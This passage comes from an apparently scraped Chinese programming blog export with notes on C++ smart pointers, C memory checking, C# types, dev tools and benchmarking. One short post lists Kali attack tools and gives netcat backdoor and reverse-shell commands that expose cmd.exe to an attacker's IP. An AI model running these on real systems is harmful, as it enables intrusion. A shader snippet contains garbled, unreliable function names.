控制权转移，p 变为 null，引用计数加不变 if (weak_p.expired()) printf(\"错误：弱引用已失效！\"); else weak_p.lock()-&gt;do_something(); // 正常执行，p 的生命周期仍被 objlist 延续着 objlist.clear(); // 刚刚 p 移交给 func 的生命周期结束了！引用计数减1，变成0了 if (weak_p.expired()) // 因为 shared_ptr 指向的对象已释放，弱引用会失效 printf(\"错误：弱引用已失效！\"); else weak_p.lock()-&gt;do_something(); // 不会执行 return 0; // 到这里最后一个弱引用 weak_p 也被释放，他指向的“管理块”被释放&#125; 123456分配内存!use count = 1use count = 1我的数字是 42!释放内存!错误：弱引用已失效！ 智能指针作为类的成员变量 判断要用哪一种智能指针： unique_ptr：当该指针所指对象仅仅属于我时。比如：父窗口中指向子窗口的指针。 原始指针：当该对象不属于我，但他释放前我必然被释放时。有一定风险。对象使用指针。比如：子窗口中指向父窗口的指针。 shared_ptr：当该对象由多个对象共享时，或虽然该对象仅仅属于我，但有使用 weak_ptr 的需要，对象使用shared_ptr。 weak_ptr：当该对象不属于我，且他释放后我仍可能不被释放时，对象使用weak_ptr。比如：指向窗口中上一次被点击的元素。 初学者可以多用 shared_ptr 和 weak_ptr 的组合，更安全。 shared_ptr 需要维护一个 atomic 的引用计数器，效率低，需要额外的一块管理内存，访问实际对象需要二级指针，而且 deleter 使用了类型擦除技术。 全部用 shared_ptr，可能出现循环引用之类的问题，导致内存泄露，依然需要使用不影响计数的原始指针或者 weak_ptr 来避免。 1234567891011121314151617181920#include &lt;memory&gt;struct C &#123; std::shared_ptr&lt;C&gt; m_child; std::shared_ptr&lt;C&gt; m_parent;&#125;;int main() &#123; auto parent = std::make_shared&lt;C&gt;(); auto child = std::make_shared&lt;C&gt;(); // 建立相互引用： parent-&gt;m_child = child; child-&gt;m_parent = parent; parent = nullptr; // parent 不会被释放！因为 child 还指向他！ child = nullptr; // child 也不会被释放！因为 parent 还指向他！ return 0;&#125; 如何解决？只需要把其中逻辑上“不具有所属权”的那一个改成 weak_ptr 即可： 1234567891011121314151617181920#include &lt;memory&gt;struct C &#123; std::shared_ptr&lt;C&gt; m_child; std::weak_ptr&lt;C&gt; m_parent;&#125;;int main() &#123; auto parent = std::make_shared&lt;C&gt;(); auto child = std::make_shared&lt;C&gt;(); // 建立相互引用： parent-&gt;m_child = child; child-&gt;m_parent = parent; parent = nullptr; // parent 会被释放。因为 child 指向他的是 **弱引用** child = nullptr; // child 会被释放。因为指向 child 的 parent 已经释放了 return 0;&#125; 改成 weak_ptr， 没有 parent 的所有权。 也可以把 m_parent 变成原始指针。 1234567891011121314151617181920#include &lt;memory&gt;struct C &#123; std::shared_ptr&lt;C&gt; m_child; C *m_parent;&#125;;int main() &#123; auto parent = std::make_shared&lt;C&gt;(); auto child = std::make_shared&lt;C&gt;(); // 建立相互引用： parent-&gt;m_child = child; child-&gt;m_parent = parent.get(); parent = nullptr; // parent 会被释放。因为 child 指向他的是原始指针 child = nullptr; // child 会被释放。因为指向 child 的 parent 已经释放了 return 0;&#125; 假定他释放前我必然被释放，完全可以把 m_child 变成一个标志这“完全所有权”的 unique_ptr。 1234567891011121314151617181920#include &lt;memory&gt;struct C &#123; std::unique_ptr&lt;C&gt; m_child; C *m_parent;&#125;;int main() &#123; auto parent = std::make_unique&lt;C&gt;(); auto child = std::make_unique&lt;C&gt;(); // 建立相互引用： child-&gt;m_parent = parent.get(); parent-&gt;m_child = std::move(child); // 移交 child 的所属权给 parent parent = nullptr; // parent 会被释放。因为 child 指向他的是原始指针 // 此时 child 也已经被释放了，因为 child 完全隶属于 parent return 0;&#125; 安全类型 以下类型是安全的： 1234int id; // 基础类型std::vector&lt;int&gt; arr; // STL 容器std::shared_ptr&lt;Object&gt; child; // 智能指针Object *parent; // 原始指针，如果是从智能指针里 .get() 出来的 以下对象是不安全的： 123char *ptr; // 原始指针，如果是通过 malloc/free 或 new/delete 分配的GLint tex; // 是基础类型 int，但是对应着某种资源std::vector&lt;Object *&gt; objs; // STL 容器，但存了不安全的对象 有不安全类型成员的对象的类的设计需要考虑之前的设计原则问题。 如果你的类所有成员，都是安全的类型，那么五大构造/析构函数都无需声明（或声明为 = default），你的类自动就是安全的。 最好的判断方式是：如果你不需要自定义的解构函数，那么这个类就不需要担心。 因为如果用到了自定义解构函数，往往意味着你的类成员中，包含有不安全的类型。 这样的类型一般无外乎两种情况： 你的类管理着资源。 你的类是数据结构。 管理着资源的类 这个类管理着某种资源，资源往往不能被“复制”。比如一个 OpenGL 的着色器，或是一个 Qt 的窗口。 一般删除拷贝函数，然后统一用智能指针管理。 1234567891011struct Shader &#123; GLuint sha; GLuint target&#123;GL_ARRAY_BUFFER&#125;; Shader(GLuint type) &#123; CHECK_GL(sha = g1CreateShader(type)); &#125; ~Shader() &#123; CHECK_GL(g1DeIeteShader(sha)); &#125; Shader(Shader const &amp;) = delete; Shader &amp;operator=(Shader const &amp;) = delete;&#125;; 数据结构类 如果可以，自己定义拷贝和移动函数。 函数参数类型优化 如果是基础类型（比如 int，float）则按值传递： float squareRoot(float val); 如果是原始指针（比如 int ，Object ）则按值传递： void doSomethingWith(Object *ptr); 如果是数据容器类型（比如 vector，string）则按常引用传递： int sumArray(std::vector const &amp;arr); 如果数据容器不大（比如 tuple&lt;int, int&gt;），则其实可以按值传递： glm::vec3 calculateGravityAt(glm::vec3 pos); 如果是智能指针（比如 shared_ptr），且需要生命周期控制权，则按值传递： void addObject(std::shared_ptr obj); 如果是智能指针，但不需要生命周期，则通过 .get() 获取原始指针后，按值传递： void modifyObject(Object *obj); 其他语言对比 Java 和 Python 的业务需求大多是在和资源打交道，从而基本都是刚刚说的要删除拷贝函数的那一类。 Java 和 Python 干脆简化：一切非基础类型的对象都是浅拷贝，引用计数由垃圾回收机制自动管理。 以系统级编程、算法数据结构、高性能计算为主要业务的 C++，才发展出了这些思想，并将拷贝/移动/指针/可变性/多线程等概念作为语言基本元素存在。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"}],"author":"HeRui"},{"title":"C语言程序内存安全检查","slug":"C语言程序内存安全检查","date":"2023-02-10T05:04:22.000Z","updated":"2024-01-09T10:22:44.130Z","comments":true,"path":"posts/4df195e7.html","link":"","permalink":"https://racleray.github.io/posts/4df195e7.html","excerpt":"C语言程序内存安全，静态检查和动态检查","text":"静态存储区检查 123set(CMAKE_EXE_LINKER_FLAGS \"-Wl,-Map=output.map\") # 生成map文件 set(CMAKE_C_FLAGS \"-fdata-sections\") # 把static变量地址输出到map文件 set(CMAKE_CXX_FLAGS \"-fdata-sections\") 帮助检测静态存储区的arr数组是否出现了数组越界操作。 动态存储区检查 工具 ASAN dmalloc valgrind ASAN ASAN（Address Sanitizer）是针对 C/C++ 的快速内存错误检测工具，在运行时检测 C/C++ 代码中的多种内存错误。 在 GCC 编译选项中设置 -fsanitize=address，启用快速内存错误检测器 ASAN。比如 -fsanitize-coverage=trace-pc，启用覆盖率指导的模糊代码检测，等。 详细参考：Home · google/sanitizers Wiki (github.com) Valgrind Valgrind由内核（core）以及基于内核的其他调试工具组成。其基于仿真方式对程序进行调试，它先于应用程序获取实际处理器的控制权，并在实际处理器的基础上仿真一个虚拟处理器，并使应用程序运行于这个虚拟处理器之上，从而对应用程序的运行进行监视。 官网 Valgrind工具包包含多个工具，如Memcheck、Cachegrind、Helgrind、Callgrind、Massif。 Memcheck工具是Valgrind中最常用的工具，用来检测程序中出现的内存问题。 Callgrind收集程序运行时的一些数据，函数调用关系等信息，还可以有选择地进行cache模拟。在运行结束时，它会把分析数据写入一个文件。 Helgrind 主要用来检查多线程程序中出现的竞争问题。 Callgrind 模拟 CPU中的一级缓存I1,D1和L2二级缓存，能够精确地指出程序中 cache的丢失和命中。 Massif 堆栈分析器，它能测量程序在堆栈中使用了多少内存，如堆块、堆管理块和栈的大小。 简单使用，对下面的 C 程序进行测试： 1234567891011#include &lt;stdlib.h&gt; void f(void) &#123; int* x = malloc(10 * sizeof(int)); x[10] = 0; // problem 1: heap block overrun &#125; // problem 2: memory leak -- x not freed int main(void) &#123; f(); return 0; &#125; 12345sudo apt install valgrindgcc -g valgrind_test.c -o valgrind_testvalgrind --leak-check=yes --tool=memcheck ./valgrind_test 自定义带检测的内存管理函数 在实际内容前后加上指定的标记数据，达到检测哨兵的效果。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#define BEFORE_RED_AREA_LEN (4) // 前红区长度 #define AFTER_RED_AREA_LEN (4) // 后红区长度 #define LEN_AREA_LEN (4) // 长度区长度 #define BEFORE_RED_AREA_DATA (0x11223344u) // 前红区数据 #define AFTER_RED_AREA_DATA (0x55667788u) // 后红区数据 void *Malloc(size_t __size) &#123; // 申请内存：4 + 4 + __size + 4 void *ptr = malloc(BEFORE_RED_AREA_LEN + AFTER_RED_AREA_LEN + __size + LEN_AREA_LEN); if (NULL == ptr) &#123; printf(\"[%s]malloc error\\n\", __FUNCTION__); return NULL; &#125; // 往前红区地址写入固定值 *((unsigned int*)(ptr)) = BEFORE_RED_AREA_DATA; // 往长度区地址写入长度 *((unsigned int*)(ptr + BEFORE_RED_AREA_LEN)) = __size; // 往后红区地址写入固定值 *((unsigned int*)(ptr + BEFORE_RED_AREA_LEN + LEN_AREA_LEN + __size)) = AFTER_RED_AREA_DATA; // 返回数据区地址 void *data_area_ptr = (ptr + BEFORE_RED_AREA_LEN + LEN_AREA_LEN); return data_area_ptr; &#125;void CheckMem(void *ptr, size_t __size) &#123; void *data_area_ptr = ptr; // 检测是否踩了前红区 printf(\"[%s]before_red_area_data = 0x%x\\n\", __FUNCTION__, *((unsigned int*)(data_area_ptr - LEN_AREA_LEN - BEFORE_RED_AREA_LEN))); assert(*((unsigned int*)(data_area_ptr - LEN_AREA_LEN - BEFORE_RED_AREA_LEN)) == BEFORE_RED_AREA_DATA); // 检测是否踩了长度区 printf(\"[%s]len_area_data = 0x%x\\n\", __FUNCTION__, *((unsigned int*)(data_area_ptr - LEN_AREA_LEN))); assert(*((unsigned int*)(data_area_ptr - LEN_AREA_LEN)) == __size); // 检测是否踩了后红区 printf(\"[%s]after_red_area_data = 0x%x\\n\", __FUNCTION__, *((unsigned int*)(data_area_ptr + __size))); assert(*((unsigned int*)(data_area_ptr + __size)) == AFTER_RED_AREA_DATA); &#125;void Free(void *ptr) &#123; void *all_area_ptr = ptr - LEN_AREA_LEN - BEFORE_RED_AREA_LEN; // 检测是否踩了前红区 printf(\"[%s]before_red_area_data = 0x%x\\n\", __FUNCTION__, *((unsigned int*)(all_area_ptr))); assert(*((unsigned int*)(all_area_ptr)) == BEFORE_RED_AREA_DATA); // 读取长度区内容 size_t __size = *((unsigned int*)(all_area_ptr + BEFORE_RED_AREA_LEN)); // 检测是否踩了后红区 printf(\"[%s]before_red_area_data = 0x%x\\n\", __FUNCTION__, *((unsigned int*)(all_area_ptr + BEFORE_RED_AREA_LEN + LEN_AREA_LEN + __size))); assert(*((unsigned int*)(all_area_ptr + BEFORE_RED_AREA_LEN + LEN_AREA_LEN + __size)) == AFTER_RED_AREA_DATA); // 释放所有区域内存 free(all_area_ptr); &#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C","slug":"C","permalink":"https://racleray.github.io/tags/C/"}],"author":"HeRui"},{"title":"C sharp","slug":"C-sharp","date":"2023-02-09T12:58:02.000Z","updated":"2024-01-09T10:22:55.007Z","comments":true,"path":"posts/abda3b00.html","link":"","permalink":"https://racleray.github.io/posts/abda3b00.html","excerpt":"C# basic types","text":"类型 值类型：栈 引用类型：栈上为引用，堆上为实际值 指针类型：不安全模式下才使用 类型系统设计 值类型 继承自 System.ValueType，所有类型基类 System.Object int 是 System.int32 的别名 struct public private internal: namespace 中可访问 protected enum var vname = ... 自动识别类型 引用类型： object string dynamic：运行时检测类型 class interface abstract class 与 interface 的区别 abstract class 可以有成员字段，有实现的方法，class只能继承自一个abstract class interface 不能有成员字段，不能有实现的方法，class可以继承自多个interface 类型转换 大范围类型向小范围类型转换，需要显示转换，丢失精度 父类向子类转化，使用 parent as child，转换失败会返回 null 指针 .ToString() Convert.ToInt32(\"199\") Int32.TryParse(\"asdf\", out intValue) IConventible: 值类型转到堆上，返回引用 object boxed = stackVal TypeConventer: 引用指向的值，存到栈上 int unboxed = (int)referenceObj int? 可为空的 int 类型 （Nullable） 集合类型 array int[] numbers = new int[6]; int[,] 2darray = new int[3, 3]; int[][] vard = new int[5][]; ArrayList List 强制使用一种类型，相较于ArrayList而言 Hashtable key, value 类型不需要每个条目间一致 Dictionary key, value 类型需要与指定模板中类型一致 ConcurrentDictionary SortedList 根据 key 值排序","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C#","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C-sharp","slug":"C-sharp","permalink":"https://racleray.github.io/tags/C-sharp/"}],"author":"HeRui"},{"title":"kali hack tools","slug":"kali-hack-tools","date":"2023-01-09T04:59:21.000Z","updated":"2024-01-09T10:22:35.870Z","comments":true,"path":"posts/886c7636.html","link":"","permalink":"https://racleray.github.io/posts/886c7636.html","excerpt":"kali linux hack tools","text":"kali hack tools DNS 分析 dnsdict6 install wget https://github.com/vanhauser-thc/thc-ipv6/archive/refs/tags/v3.8.tar.gz tar zvxf v3.8.tar.gz cd thc-ipv6-3.8 sudo apt-get install libpcap-dev libssl-dev libnetfilter-queue1 libnetfilter-queue-dev make sudo cp dnsdict6 /usr/bin/ usage Enumerates a domain for DNS entries. dnsmap dnsrecon fierce 查找目标的ip和主机名，进行子域名爆破 lbd load balance detector 检测DNS、HTTP、HTTPS是否负载均衡 reverseraider kali已经移除 host dig dnsenum dmitry 网络扫描 traceroute windows 下 tracert 用于探测网络环境 tctrace 搜索引擎信息 fimap 漏洞扫描 谷歌搜素结果收集 theharvester 多种引擎可以用 后门维持连接 netcat 维持了 cmd.exe 的权限 目标机器：nc.exe -d -L -p 8888 -e cmd.exe；入侵机器：nc 目标ip 8888 入侵机器：nc -l -p 8888；目标机器：nc.exe -d 入侵机器ip 8888 -e cmd.exe 内网安全 arp欺骗：ettercap dns欺骗 截获数据流量：在arp欺骗到目标网卡基础上，driftnet -i 目标网卡 密码攻击 medusa hashcat rarcrack: rar 密码破解 fcrackzip: zip 密码破解 crunch: 离线密码破解 cewl: 在线密码破解 hydra: 在线密码破解","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"hack","slug":"Notes/hack","permalink":"https://racleray.github.io/categories/Notes/hack/"}],"tags":[{"name":"hack","slug":"hack","permalink":"https://racleray.github.io/tags/hack/"},{"name":"kali","slug":"kali","permalink":"https://racleray.github.io/tags/kali/"}],"author":"HeRui"},{"title":"开发工具","slug":"开发工具","date":"2023-01-03T10:41:33.000Z","updated":"2024-01-09T10:20:06.141Z","comments":true,"path":"posts/897196e0.html","link":"","permalink":"https://racleray.github.io/posts/897196e0.html","excerpt":"开发工具库","text":"C++ 是解决性能问题的利器。当你的软件属于运算密集或者内存密集型，你需要性能、且愿意为性能付出额外代价的时候，应该考虑⽤ C++，特别在你的代码需要部署在多台服务器或者移动设备的场合。反之，如果性能不会成为你开发的软件的瓶颈，那 C++ 可能就不是⼀个最合适的⼯具。 C++ 语⾔就像学⼀⻔活跃使⽤中的外语，你不要期望能够掌握所有的单词和语法规则。我们需要的是多看多写，掌握合适 的“语感”，⽽不是记住所有的规则。 排错工具 Valgrind 查出内存相关的错误。 g++ -g test.cpp 编译之后，然后使⽤ valgrind --leak-check=full ./a.out。 Compiler Explorer https://godbolt.org/ C++ Insights https://cppinsights.io/ 单元测试 Boost.Test 1234567891011121314151617181920212223#define BOOST_TEST_MAIN #include &lt;boost/test/unit_test.hpp&gt; #include &lt;stdexcept&gt;void test(int n) &#123; if (n == 42) &#123; return; &#125; throw std::runtime_error( \"Not the answer\");&#125;BOOST_AUTO_TEST_CASE(my_test) &#123; BOOST_TEST_MESSAGE(\"Testing\"); BOOST_TEST(1 + 1 == 2); BOOST_CHECK_THROW( test(41), std::runtime_error); BOOST_CHECK_NO_THROW(test(42)); int expected = 5; BOOST_TEST(2 + 2 == expected); BOOST_CHECK(2 + 2 == expected);&#125;BOOST_AUTO_TEST_CASE(null_test) &#123; &#125; Catch2 只需要单个头⽂件即可使⽤，不需要安装和链接，简单⽅便 可选使⽤ BDD（Behavior-Driven Development）⻛格的分节形式 测试失败可选直接进⼊调试器（Windows 和 macOS 上） 123456789101112131415161718192021#define CATCH_CONFIG_MAIN#include \"catch.hpp\" #include &lt;stdexcept&gt;void test(int n) &#123; if (n == 42) &#123; return; &#125; throw std::runtime_error( \"Not the answer\");&#125;TEST_CASE(\"My first test\", \"[my]\") &#123; INFO(\"Testing\"); CHECK(1 + 1 == 2); CHECK_THROWS_AS( test(41), std::runtime_error); CHECK_NOTHROW(test(42)); int expected = 5; CHECK(2 + 2 == expected);&#125;TEST_CASE(\"A null test\", \"[null]\") &#123; &#125; BDD ⻛格的测试: 1234567891011121314151617181920212223242526272829303132#define CATCH_CONFIG_MAIN #include \"catch.hpp\"SCENARIO(\"Int container can be accessed and modified\", \"[container]\")&#123; GIVEN(\"A container with initialized items\") &#123; IntContainer c&#123;1, 2, 3, 4, 5&#125;; REQUIRE(c.size() == 5); WHEN(\"I access existing items\") &#123; THEN(\"The items can be retrieved intact\") &#123; CHECK(c[0] == 1); CHECK(c[1] == 2); CHECK(c[2] == 3); CHECK(c[3] == 4); CHECK(c[4] == 5); &#125; &#125; WHEN(\"I modify items\") &#123; c[1] = -2; c[3] = -4; THEN(\"Only modified items are changed\") &#123; CHECK(c[0] == 1); CHECK(c[1] == -2); CHECK(c[2] == 3); CHECK(c[3] == -4); CHECK(c[4] == 5); &#125; &#125; &#125;&#125; 日志库 Easylogging++ Easylogging++ ⼀共只有两个⽂件，⼀个是头⽂件，⼀个是普通 C++ 源⽂件。 123456#include \"easylogging++.h\" INITIALIZE_EASYLOGGINGPPint main() &#123; LOG(INFO) &lt;&lt; \"My first info log\"; &#125; 1g++ -std=c++17 test.cpp easylogging++.cc spdlog 123456789#include \"spdlog/spdlog.h\"#include \"spdlog/sinks/basic_file_sink.h\"int main() &#123; spdlog::info(\"My first info log\"); auto file_logger = spdlog::basic_logger_mt( \"basic_logger\", \"test.log\"); spdlog::set_default_logger( file_logger); spdlog::info(\"Into file: &#123;1&#125; &#123;0&#125;\", \"world\", \"hello\");&#125; 其他比如：Boost.Log、g3log 等 网络应用工具库 C++ REST SDK cpprestsdk ：https://github.com/microsoft/cpprestsdk 使用时，编译麻烦： Windows MSVC： 1cl /EHsc /std:c++17 test.cpp cpprest.lib zlib.lib libeay32.lib ssleay32.lib winhttp.lib httpapi.lib bcrypt.lib crypt32.lib advapi32.lib gdi32.lib user32.lib Linux GCC： 1g++ -std=c++17 -pthread test.cpp -lcpprest -lcrypto -lssl lboost_thread -lboost_chrono -lboost_system","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"C++","slug":"Tools/C","permalink":"https://racleray.github.io/categories/Tools/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Python","slug":"Python","permalink":"https://racleray.github.io/tags/Python/"}],"author":"HeRui"},{"title":"Cpp性能测试","slug":"Cpp性能测试","date":"2022-12-09T05:04:05.000Z","updated":"2024-03-03T16:14:54.388Z","comments":true,"path":"posts/f692d883.html","link":"","permalink":"https://racleray.github.io/posts/f692d883.html","excerpt":"C++高性能编程测试用环境","text":"实验一 先确定测量指标 从实际运行搜集输入 不要对性能进行假设 使用微基准测试深入理解代码 部分有益的优化，可能对程序整体有害 高性能程序的开发与优化，不是线性过程，可能需要在高级概览和低级细节中反复迭代测试 在性能方面，没有什么是显而易见的 看似不必要的代码，删除之后，可能会导致性能下降，请搞清楚如何有效利用 CPU 以获得性能提升 Pre-requirements 12345678sudo pacman -S gperftoolsgit clone https://github.com/google/benchmark.git --depth=1cd benchmarkcmake -E make_directory \"build\"cmake -E chdir \"build\" cmake -DBENCHMARK_DOWNLOAD_DEPENDENCIES=on -DCMAKE_BUILD_TYPE=Release ../cmake --build \"build\" --config Release 12// codegit clone git@github.com:PacktPublishing/The-Art-of-Writing-Efficient-Programs.git gperftools 1clang++ -g -O3 -mavx2 -Wall -pedantic 02_substring_sort.C -o example &amp;&amp; CPUPROFILE=prof.data ./example &amp;&amp; pprof --text ./example prof.data 1clang++ -g -O3 -mavx2 -Wall -pedantic 03_substring_sort.C -o example &amp;&amp; CPUPROFILE=prof.data ./example &amp;&amp; pprof --text ./example prof.data 1clang++ -g -O3 -mavx2 -Wall -pedantic 04_substring_sort.C -o example &amp;&amp; CPUPROFILE=prof.data ./example &amp;&amp; pprof --text ./example prof.data clang++ 13 在 -O3 下的结果，和 clang++-11 的结果不同。 对 compare 函数的优化，13 实在是太厉害了。 perf 使用硬件性能计数器和基于时间的采样。 12345678// 可选事件列表perf listperf stat ./example// 性能分析器perf record ./exampleperf report 由于编译器优化，指令重排等，perf 显示的汇编代码和源代码的对应关系并不准确。 Google Performance 123456// -lprofilerclang++ -g -O3 -mavx2 -Wall -pedantic -lprofiler 02_substring_sort.C -o exampleCPUPROFILE=prof.data CPUPROFILE_FREQUENCY=1000 ./examplepprof ./example prof.data 12// 调用图pprof --pdf ./example prof.data &gt; prof.pdf 微基准测试 大型程序性能测试： 整体编译时间长 性能关键部分不那么明显 目标上下文发生的概率可能较小，比如特定的网络请求时发生 微基准测试，关注某个函数的测试。通过设置函数的起始条件，轻松调用此代码片段。 另外，微基准测试 严重依赖运行代码时，程序所处的上下文环境。测试时，将目标函数放单独在一个编译单元编译，可以缓解编译器优化，对目标函数的运行结果的影响。 微基准测试，不可不信，不可全信。 编译器优化 C++ 标准中，定义了一个关键概念：可观察行为（observable behavior）。 编译器可以对程序进行任何它想要的更改，只要这些更改的结果不会改变可观察行为的结果。 volatile 对象的访问，严格按照表达式的语义，不会对其重新排序 程序终止时，写入文件时，严格按照程序写入的方式执行 发送到交互设备的提示文本，将在程序等待输入之前，输出显示。输入和输出操作不能被省略或者重排 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;chrono&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;memory&gt;using std::chrono::duration_cast;using std::chrono::microseconds;using std::chrono::system_clock;using std::cout;using std::endl;using std::unique_ptr;bool compare1(const char* s1, const char* s2) &#123; int i1 = 0, i2 = 0; char c1, c2; while (1) &#123; c1 = s1[i1]; c2 = s2[i2]; if (c1 != c2) return c1 &gt; c2; ++i1; ++i2; &#125;&#125;bool compare2(const char* s1, const char* s2) &#123; unsigned int i1 = 0, i2 = 0; char c1, c2; while (1) &#123; c1 = s1[i1]; c2 = s2[i2]; if (c1 != c2) return c1 &gt; c2; ++i1; ++i2; &#125;&#125;int main() &#123; constexpr unsigned int N = 1 &lt;&lt; 20; constexpr int NI = 1 &lt;&lt; 11; unique_ptr&lt;char[]&gt; s(new char[2*N]); ::memset(s.get(), 'a', 2*N*sizeof(char)); s[2*N-1] = 0; system_clock::time_point t0 = system_clock::now(); for (int i = 0; i &lt; NI; ++i) &#123; compare1(s.get(), s.get() + N); &#125; system_clock::time_point t1 = system_clock::now(); for (int i = 0; i &lt; NI; ++i) &#123; compare2(s.get(), s.get() + N); &#125; system_clock::time_point t2 = system_clock::now(); cout &lt;&lt; duration_cast&lt;microseconds&gt;(t1 - t0).count() &lt;&lt; \"us \" &lt;&lt; duration_cast&lt;microseconds&gt;(t2 - t1).count() &lt;&lt; \"us\" &lt;&lt; endl;&#125; 这段程序，compare1、compare2 不会改变程序中 s 的可观察行为。编译器直接跳过执行。输出时间是 0。 使用 volatile 可以正常执行测试： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;chrono&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;memory&gt;using std::chrono::duration_cast;using std::chrono::microseconds;using std::chrono::system_clock;using std::cout;using std::endl;using std::unique_ptr;bool compare1(const char* s1, const char* s2) &#123; int i1 = 0, i2 = 0; char c1, c2; while (1) &#123; c1 = s1[i1]; c2 = s2[i2]; if (c1 != c2) return c1 &gt; c2; ++i1; ++i2; &#125;&#125;bool compare2(const char* s1, const char* s2) &#123; unsigned int i1 = 0, i2 = 0; char c1, c2; while (1) &#123; c1 = s1[i1]; c2 = s2[i2]; if (c1 != c2) return c1 &gt; c2; ++i1; ++i2; &#125;&#125;int main() &#123; constexpr unsigned int N = 1 &lt;&lt; 20; constexpr int NI = 1 &lt;&lt; 11; unique_ptr&lt;char[]&gt; s(new char[2*N]); ::memset(s.get(), 'a', 2*N*sizeof(char)); s[2*N-1] = 0; volatile bool sink; // difference system_clock::time_point t0 = system_clock::now(); for (int i = 0; i &lt; NI; ++i) &#123; sink = compare1(s.get(), s.get() + N); // difference &#125; system_clock::time_point t1 = system_clock::now(); for (int i = 0; i &lt; NI; ++i) &#123; sink = compare2(s.get(), s.get() + N); // difference &#125; system_clock::time_point t2 = system_clock::now(); cout &lt;&lt; duration_cast&lt;microseconds&gt;(t1 - t0).count() &lt;&lt; \"us \" &lt;&lt; duration_cast&lt;microseconds&gt;(t2 - t1).count() &lt;&lt; \"us\" &lt;&lt; endl;&#125; Google benchmark 1234567891011git clone https://github.com/google/benchmark.git --depth=1cd benchmarkcmake -E make_directory \"build\"cmake -E chdir \"build\" cmake -DBENCHMARK_DOWNLOAD_DEPENDENCIES=on -DCMAKE_BUILD_TYPE=Release ../cmake --build \"build\" --config Releaseexport GBEN_INC=xxx/benchmark/include/export GBEN_LIB=xxx/benchmark/build/src/clang++ -g -O3 -mavx2 -Wall -pedantic -I$GBEN_INC -lpthread -lrt -lm 10a_compare_mbm.C $GBEN_LIB/libbenchmark.a -o benchmark 1./benchmark 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include &lt;memory&gt;#include \"benchmark/benchmark.h\"using std::unique_ptr;bool compare_int(const char* s1, const char* s2) &#123; char c1, c2; for (int i1 = 0, i2 = 0; ; ++i1, ++i2) &#123; c1 = s1[i1]; c2 = s2[i2]; if (c1 != c2) return c1 &gt; c2; &#125;&#125;bool compare_uint(const char* s1, const char* s2) &#123; char c1, c2; for (unsigned int i1 = 0, i2 = 0; ; ++i1, ++i2) &#123; c1 = s1[i1]; c2 = s2[i2]; if (c1 != c2) return c1 &gt; c2; &#125;&#125;bool compare_uint_l(const char* s1, const char* s2, unsigned int l) &#123; if (s1 == s2) return false; char c1, c2; for (unsigned int i1 = 0, i2 = 0; i1 &lt; l; ++i1, ++i2) &#123; c1 = s1[i1]; c2 = s2[i2]; if (c1 != c2) return c1 &gt; c2; &#125; return false;&#125;void BM_loop_int(benchmark::State&amp; state) &#123; const unsigned int N = state.range(0); unique_ptr&lt;char[]&gt; s(new char[2*N]); ::memset(s.get(), 'a', 2*N*sizeof(char)); s[2*N-1] = 0; const char* s1 = s.get(), *s2 = s1 + N; for (auto _ : state) &#123; benchmark::DoNotOptimize(compare_int(s1, s2)); &#125; state.SetItemsProcessed(N*state.iterations());&#125;void BM_loop_uint(benchmark::State&amp; state) &#123; const unsigned int N = state.range(0); unique_ptr&lt;char[]&gt; s(new char[2*N]); ::memset(s.get(), 'a', 2*N*sizeof(char)); s[2*N-1] = 0; const char* s1 = s.get(), *s2 = s1 + N; for (auto _ : state) &#123; benchmark::DoNotOptimize(compare_uint(s1, s2)); &#125; state.SetItemsProcessed(N*state.iterations());&#125;void BM_loop_uint_l(benchmark::State&amp; state) &#123; const unsigned int N = state.range(0); unique_ptr&lt;char[]&gt; s(new char[2*N]); ::memset(s.get(), 'a', 2*N*sizeof(char)); s[2*N-1] = 0; const char* s1 = s.get(), *s2 = s1 + N; for (auto _ : state) &#123; benchmark::DoNotOptimize(compare_uint_l(s1, s2, 2*N)); &#125; state.SetItemsProcessed(N*state.iterations());&#125;#define ARGS -&gt;Arg(1&lt;&lt;20)BENCHMARK(BM_loop_int) ARGS;BENCHMARK(BM_loop_uint) ARGS;BENCHMARK(BM_loop_uint_l) ARGS;BENCHMARK_MAIN(); benchmark::State&amp; state : 入参；state.SetItemsProcessed : 报告代码每秒处理的字符数；-&gt;Arg(1&lt;&lt;20) : 向 BENCHMARK 宏传递参数。 benchmark::DoNotOptimize : 类似 volatile sink 的作用，不会将 compare_uint 函数调用优化掉，但是函数内部逻辑还是会进行优化。 实验二 高效利用 CPU 资源 CPU 指令运行优化 对于每次循环，独立地，对寄存器中相同的数据，进行不同的操作，是可以指令级并行的。 数据依赖依靠流水线技术，错位执行。每个循环使用相同的寄存器，对于同一个寄存器不能在一个周期内既读又写。但是这是对于编译器而言，实际上硬件上的寄存器并不一定相同。寄存器重命名，可以使得相同寄存器名称实际在运行时可以对应到不同的硬件寄存器。 流水线技术需要足够多的指令才能发挥出其性能优势。如果出现分支，那么需要分支预测，来尽可能提供更多的指令来运行。 分支预测 + 推测执行，处理器会根据历史运行结果，推测是否需要执行某个分支的指令。如果预测正确，并行化提高了性能；如果预测错误，就需要冲刷流水线，丢弃预测错误的指令。 perf stat ./benchmark 可以查看分支预测的情况 推测执行可能会出现问题，比如 *ptr 解引用了 NULL 指针，但是由于 CPU 